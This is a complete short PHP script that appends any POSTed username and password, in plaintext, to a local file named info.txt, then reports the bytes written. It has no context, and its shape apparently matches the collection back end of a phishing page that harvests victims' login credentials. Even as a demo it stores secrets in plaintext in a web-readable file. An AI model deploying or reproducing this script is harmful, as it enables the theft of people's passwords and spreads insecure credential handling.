<?php
if(isset($_POST['username']) && isset($_POST['password'])) {
    $data = $_POST['username'] . '-' . $_POST['password'] . "\n";
    $ret = file_put_contents('info.txt', $data, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('There was an error writing this file');
    }
    else {
        echo "$ret bytes written to file";
    }
}
else {
   die('no post data to process');
}
	